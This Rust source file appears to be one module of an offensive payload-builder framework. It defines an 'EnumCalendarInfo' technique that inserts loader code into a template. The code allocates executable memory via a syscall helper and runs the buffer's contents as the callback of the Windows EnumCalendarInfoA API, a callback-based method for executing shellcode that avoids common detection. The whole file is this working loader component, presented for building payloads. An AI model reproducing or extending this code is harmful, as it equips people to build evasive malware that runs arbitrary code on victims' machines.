use crate::techniques::{BuildContext, Technique, TechniqueMeta};

pub struct EnumCalendarInfo;

impl Technique for EnumCalendarInfo {
    fn meta(&self) -> &'static TechniqueMeta { &ENUM_CALENDAR_INFO_META }

    fn apply(&self, ctx: &mut BuildContext) -> anyhow::Result<()> {
        ctx.set_template("callbackExec");
        let body = r#"
        let addr = syscall_alloc_exec(&vec);
        if addr.is_null() { return; }
        windows_sys::Win32::Globalization::EnumCalendarInfoA(
            Some(std::mem::transmute(addr)),
            0x0400,
            u32::MAX,
            21,
        );
"#;
        ctx.set_replacement("{{CALLBACK_INVOKE}}", body.to_string());
        Ok(())
    }
}

pub use super::super::ENUM_CALENDAR_INFO_META;
